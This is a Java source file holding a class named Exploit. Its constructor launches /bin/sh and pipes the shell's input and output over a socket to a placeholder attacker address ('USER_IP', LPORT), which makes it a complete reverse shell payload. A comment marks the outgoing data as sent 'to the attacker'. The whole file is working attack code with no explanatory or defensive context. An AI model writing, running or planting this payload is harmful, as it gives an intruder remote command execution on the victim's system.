public class Exploit {
    public Exploit() throws Exception {
        java.lang.Process p = new java.lang.ProcessBuilder("/bin/sh").start();
        java.net.Socket s = new java.net.Socket("USER_IP", LPORT);
        java.io.InputStream pi = p.getInputStream(), si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        byte[] buf = new byte[1024];

        while (!s.isClosed()) {
            if (pi.available() > 0) {
                int bytesRead = pi.read(buf);
                if (bytesRead > 0) so.write(buf, 0, bytesRead);
            }
            if (si.available() > 0) {
                int bytesRead = si.read(buf);
                if (bytesRead > 0) po.write(buf, 0, bytesRead);
            }
            so.flush();  // Ensure data is sent to the attacker
            po.flush();  // Ensure data is sent to the target process

            Thread.sleep(50);  // Allow CPU to breathe, reduces potential lag
        }
    }
}
